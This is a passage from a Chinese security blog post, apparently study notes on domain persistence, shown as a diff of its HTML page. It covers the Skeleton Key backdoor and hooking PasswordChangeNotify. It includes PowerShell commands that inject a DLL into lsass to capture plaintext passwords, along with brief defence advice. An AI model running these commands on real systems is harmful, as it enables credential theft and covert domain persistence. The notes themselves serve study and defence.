+<p>注入后，可以使用密码<code>mimikatz</code>进入系统</p>
+<h4 id="Skeleton-Key防御"><a href="#Skeleton-Key防御" class="headerlink" title="Skeleton Key防御"></a>Skeleton Key防御</h4><p>2014年，微软在Windows中添加了LSA保护措施，防止lsass.exe进程恶意注入。<br>通用的保护措施如下:</p>
+<ul>
+<li>注入后，系统重启使得Skeleton  Key失效</li>
+</ul>
+<h3 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h3><p>Hook PasswordChangeNotify的作用是当用户修改密码后在系统中进行同步。可以利用该功能获得用户修改密码使得密码明文。</p>
+<p>在修改密码是，用户输入新的密码后，LSA调用PasswordFileter检查密码复杂度是否符号要求。如果符合要求，LSA调用PasswordChangeNotify，在系统中同步密码</p>
+<h4 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h4><p>通过PowerSploit的 Invoke-ReflectivePEInjection.ps1 模块将 HookPasswordChange.dll注入内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath .\HookPasswordReset.dll -procname lsass</span><br></pre></td></tr></table></figure>
+<p>用户修改密码后，密码保存在<code>C;|windows\temp\password.txt</code>文件中</p>
+<h4 id="HookPasswrod防范"><a href="#HookPasswrod防范" class="headerlink" title="HookPasswrod防范"></a>HookPasswrod防范</h4><p>使用该方法，不需要重启系统，不会在磁盘中留下DLL文件，不需要修改注册表。如果被利用很难被监控。所以需要在日常的管理中对PowerShell进行严格的监控</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"># 内网</a>
+          
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+          
+            <a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="tag"># 权限维持</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/05/29/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B06/" rel="next" title="内网安全攻防笔记6">
+                <i class="fa fa-chevron-left"></i> 内网安全攻防笔记6
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Laplace</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">70</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="nav-number">1.</span> <span class="nav-text">权限维持分析及防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="nav-number">1.1.</span> <span class="nav-text">操作系统后门及防范</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.1.</span> <span class="nav-text">粘滞键后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.2.</span> <span class="nav-text">注册表注入后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.3.</span> <span class="nav-text">计划任务后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI%E5%90%8E%E9%97%A8"><span class="nav-number">1.2.</span> <span class="nav-text">WMI后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebShell%E5%90%8E%E9%97%A8"><span class="nav-number">1.3.</span> <span class="nav-text">WebShell后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%90%8E%E9%97%A8"><span class="nav-number">1.3.1.</span> <span class="nav-text">php后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DC%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96%E5%88%86%E6%9E%90"><span class="nav-number">1.4.</span> <span class="nav-text">DC权限持久化分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DSRM%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="nav-number">1.4.1.</span> <span class="nav-text">DSRM域后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSP%E7%BB%B4%E6%8C%81%E5%9F%9F%E6%9D%83%E9%99%90"><span class="nav-number">1.4.2.</span> <span class="nav-text">SSP维持域权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8mimikatz%E8%BF%9B%E8%A1%8CSSP%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">使用mimikatz进行SSP注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%86mimilib-dll%E6%B7%BB%E5%8A%A0%E5%88%B0%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">将mimilib.dll添加到注册表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSP%E9%98%B2%E8%8C%83"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">SSP防范</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SID-History-%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="nav-number">1.4.3.</span> <span class="nav-text">SID History 域后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">实验</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SID-History%E5%90%8E%E9%97%A8%E9%98%B2%E5%BE%A1"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">SID History后门防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Golden-Ticket"><span class="nav-number">1.4.4.</span> <span class="nav-text">Golden Ticket</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%93%8D%E4%BD%9C"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">实验操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Golden-Ticket%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">1.4.4.2.</span> <span class="nav-text">Golden Ticket防御措施</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Silver-Ticket"><span class="nav-number">1.4.5.</span> <span class="nav-text">Silver Ticket</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="nav-number">1.4.5.1.</span> <span class="nav-text">实验过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">1.4.5.2.</span> <span class="nav-text">防御措施</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Skeleton-Key"><span class="nav-number">1.4.6.</span> <span class="nav-text">Skeleton Key</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8mimikatz"><span class="nav-number">1.4.6.1.</span> <span class="nav-text">使用mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Empire"><span class="nav-number">1.4.6.2.</span> <span class="nav-text">使用Empire</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Skeleton-Key%E9%98%B2%E5%BE%A1"><span class="nav-number">1.4.6.3.</span> <span class="nav-text">Skeleton Key防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hook-PasswordChangeNotify"><span class="nav-number">1.4.7.</span> <span class="nav-text">Hook PasswordChangeNotify</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C-1"><span class="nav-number">1.4.7.1.</span> <span class="nav-text">实验</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HookPasswrod%E9%98%B2%E8%8C%83"><span class="nav-number">1.4.7.2.</span> <span class="nav-text">HookPasswrod防范</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Laplace</span>
+
+  
+</div>
+
+<!--
+隐藏下标强力驱动
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+-->
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
